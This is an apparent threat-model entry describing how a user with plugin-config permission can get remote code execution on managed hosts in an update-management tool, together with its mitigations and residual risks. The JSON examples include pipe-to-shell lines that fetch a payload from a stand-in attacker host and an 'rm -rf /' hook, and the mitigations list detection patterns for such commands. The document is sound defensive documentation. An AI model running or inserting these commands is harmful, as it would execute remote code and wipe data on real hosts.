# ATK-16: RCE via Plugin Config Manipulation

| Field | Value |
| --- | --- |
| Severity | Critical |
| Attack surface | Plugin system / command execution |
| Prerequisites | Authenticated user with `manage_commands` permission (previously `manage_software`) |
| STRIDE | Elevation of Privilege |

## Attack description

This scenario describes the complete path from authenticated API access to remote
code execution on managed hosts via plugin configuration manipulation.

### Path 1: Shell plugin

1. The attacker creates a plugin config with `plugin_type = "generic_shell"`:

   ```json
   {
     "version_command": "curl attacker.com/payload | bash",
     "update_command": "curl attacker.com/payload | bash"
   }
   ```

2. `ShellConfig::validate()` only checks that at least one field is set — no content
   restriction on the command strings.
3. The attacker assigns the plugin config to a software item on target hosts.
4. On the next scheduled version check, the controller sends the command to the agent
   via `check_versions`.
5. The agent executes `bash -c "set -euo pipefail\ncurl attacker.com/payload | bash"`
   on the managed host.

### Path 2: Docker post_pull_command

1. The attacker creates a Docker plugin config with a malicious `post_pull_command`:

   ```json
   {
     "post_pull_command": "curl attacker.com/payload | bash"
   }
   ```

2. When the Docker image is updated, the command executes on the agent host.

### Path 3: Custom hook commands

1. The attacker creates or modifies a plugin config to include malicious hooks:

   ```json
   {
     "pre_update_commands": ["curl attacker.com/payload | bash"],
     "post_update_commands": ["rm -rf /"]
   }
   ```

2. Or using the structured format:

   ```json
   {
     "hooks": {
       "pre_update": {
         "commands": ["curl attacker.com/payload | bash"]
       }
     }
   }
   ```

3. Custom command strings in the `commands` array bypass all content validation.
4. When an update is triggered, hooks execute before and after the plugin's update
   operation.

### Path 4: Config override per host

1. The attacker modifies the `config_override` on a host-software-item-plugin
   assignment to inject hooks for a specific host, even if the base plugin config is
   clean.

## Worst-case impact

- **Arbitrary code execution on all assigned hosts.** The attacker achieves shell
  access on every managed host assigned to the affected software item, including
  SSH-managed remote hosts.
- **Root-level access.** On hosts where the agent has sudo privileges (via sudoers
  drop-in or `--allow-all`), the attacker can escalate to root.
- **Full infrastructure compromise.** With RCE on multiple hosts, the attacker can
  install persistent backdoors, exfiltrate data, pivot to internal networks, and
  modify system configurations.
- **Supply chain poisoning.** The attacker modifies the update pipeline to install
  attacker-controlled software versions on future updates.

## Current mitigations

- **Separate `manage_commands` permission.** *(Implemented)* Creating or modifying
  plugin configs requires the dedicated `manage_commands` permission, which is
  distinct from `manage_software`. Users with `manage_software` alone can manage
  software items, version tracking, and non-command config fields, but cannot alter
  the commands that execute on managed hosts. The `manage_commands` permission is
  granted only to the `owner` and `admin` roles. See
  [Authentication and Authorization](../security/auth-and-authorization.md#permissions-model---detailed)
  for the full permissions model.
- **Shell escape for substitution variables.** Dynamic values like
  `{package_identifier}` and `{version}` are shell-escaped via `shell_escape()`
  before substitution into templates. Injection through substitution variables is
  not possible.
- **`Exec` mode for predefined hooks.** Systemd and docker-compose hooks use
  `CommandSpec::exec()` (direct process argv, no shell interpretation), with
  validated parameters (character whitelists, path traversal rejection).
- **Agent runs as unprivileged user.** The agent runs as a non-root user with
  per-command sudoers entries by default. `--allow-all` (unrestricted sudo) is
  discouraged in production.
- **Output capture and limits.** Command output is captured and capped at 10 MB per
  execution, preventing unbounded resource consumption.
- **Plugin config encryption at rest.** Plugin configs are stored encrypted in the
  database via `EncryptedString`, preventing direct database reads from exposing
  command content.
- **Security audit logging.** *(Implemented)* All plugin config create, update,
  and delete operations emit a `tracing::warn!` event with the `security_audit:`
  prefix. When the config contains command-bearing fields (`version_command`,
  `update_command`, `post_pull_command`, hook commands), the log entry includes
  `command_fields` listing which fields carry executable commands. For updates,
  the log entry includes which command-bearing fields were added, modified, or
  removed compared to the previous config.
- **Command length limits.** *(Implemented)* All command strings are validated
  against `MAX_COMMAND_LENGTH` (8,192 bytes). `ShellConfig::validate()` checks
  `version_command` and `update_command`; `DockerConfig::validate()` checks
  `post_pull_command`; `HooksConfig::validate()` checks custom hook `commands`
  arrays (both length per command and count per phase via
  `MAX_HOOK_COMMANDS_PER_PHASE`). Validation constants live in
  `uptrakit-shared-types::command_validation`.
- **Dangerous pattern detection.** *(Implemented)* The controller emits advisory
  `security_audit:` warnings when command-bearing fields contain patterns
  associated with supply chain attacks (e.g., `curl|bash`, `wget|sh`, `rm -rf /`,
  fork bombs). Detection runs on both the create and update paths. Patterns are
  defined in `uptrakit-web-api-types::command_validation::detect_dangerous_patterns`.
- **Create-path validation.** *(Implemented)* The `create_plugin_config` route
  handler validates both plugin-specific config (via `validate_config_str()`) and
  hooks (via `validate_hooks_internal()`), matching the existing update path. This
  closes a gap where the create path previously skipped validation.
- **Legacy hook array validation.** *(Implemented)* The `validate_hooks_internal()`
  function now validates `pre_update_commands` and `post_update_commands` legacy flat
  arrays in plugin configs — checking element count against
  `MAX_HOOK_COMMANDS_PER_PHASE`, verifying each element is a string, and validating
  command length via `validate_command_length()`. Previously these arrays bypassed all
  validation.
- **Malformed hooks rejection.** *(Implemented)* If the `"hooks"` JSON key is present
  but cannot be parsed as a valid `HooksConfig`, validation now returns HTTP 400
  instead of silently accepting the malformed value.
- **Docker `working_dir` path traversal check.** *(Implemented)*
  `DockerConfig::validate()` now rejects `compose_restart.working_dir` values
  containing `..` path segments, matching the existing `compose_file` check.
- **Pipe-to-shell evasion detection.** *(Implemented)* The dangerous pattern
  detector now recognizes `sudo`, `env`, `doas`, and `run0` as wrappers that can
  precede a shell interpreter in pipe-to-shell patterns (e.g.,
  `curl ... | sudo bash`, `wget ... | env -i sh`).

- **Dangerous command rejection enabled by default.** *(Implemented)* Dangerous
  pattern detection is now **on by default**. Plugin config create/update requests
  containing patterns such as `curl|bash`, `rm -rf /`, fork bombs, or bash network
  sockets are rejected with HTTP 400 before the DB write. Operators who need to
  bypass this can use the `--allow-dangerous-commands` CLI flag (or
  `UPTRAKIT_ALLOW_DANGEROUS_COMMANDS` env var) to downgrade detection to
  advisory-only. See `crates/ui/web-api/src/routes/plugin_configs.rs`
  (`collect_dangerous_patterns`, `format_dangerous_pattern_rejection`).

## Residual risk

- **`manage_commands` still equals RCE.** The permission separation reduces the blast
  radius (fewer users can modify command-bearing fields), but users with
  `manage_commands` retain full effective RCE on all assigned hosts. Assigning this
  permission should be treated with the same care as granting `root` access.
- **Command content blocking can be disabled.** Dangerous command rejection is on by
  default, but operators can disable it with `--allow-dangerous-commands`. There is
  no allowlist or blocklist beyond the built-in pattern set.
- **No change approval workflow.** Plugin config modifications take effect immediately
  on the next scheduled check or triggered update. There is no second-admin approval,
  delay, or review step.
- **Broad blast radius.** A single plugin config modification can affect all hosts
  assigned to the affected software item across the entire tenant.
- **SSH agent amplification.** For SSH-managed hosts, the malicious command executes
  on remote machines through the SSH agent's connection pool, extending the blast
  radius beyond locally-managed hosts.
- **Sudoers escalation risk.** On hosts configured with `--allow-all`, the attacker
  has unrestricted root access. Even with per-command sudoers, the allowed commands
  (e.g., `apt-get`, `docker`) may be sufficient for privilege escalation.

## Recommended improvements

- Implement a "command change review" workflow where modifications to command-bearing
  plugin config fields require approval from a second administrator before taking
  effect.
- ~~Implement an immutable audit log for all plugin config changes~~ —
  **Partially implemented.** Structured `security_audit:` tracing emits
  create/update/delete events with user identity and command field detection.
  Full immutable log storage depends on log aggregation infrastructure (Loki,
  journald).
- Add a "dry run" mode that shows what commands would execute on which hosts before
  committing a plugin config change.
- Consider an optional command allowlist or blocklist per tenant that restricts the
  shell commands that can be configured (e.g., only commands matching approved
  patterns or prefixes).

## References

- [ATK-08: Shell Injection via Plugins](08-shell-injection-plugins.md)
- [ATK-17: RCE on Agents via Compromised Controller](17-rce-controller-to-agent.md)
- [Secure Development — Plugin Input Validation](../security/secure-development.md#plugin-input-validation)
- [Plugin Guidelines](../development/plugin-guidelines.md)
- [Update Hooks](../development/update-hooks.md)
- `crates/plugins/generic/shell/src/config.rs` — `ShellConfig::validate()`
- `crates/plugins/releases/docker/src/plugin.rs` — `post_pull_command` execution
- `crates/shared/update-hooks/src/lib.rs` — hook resolution
- `crates/shared/command/src/command.rs` — command execution
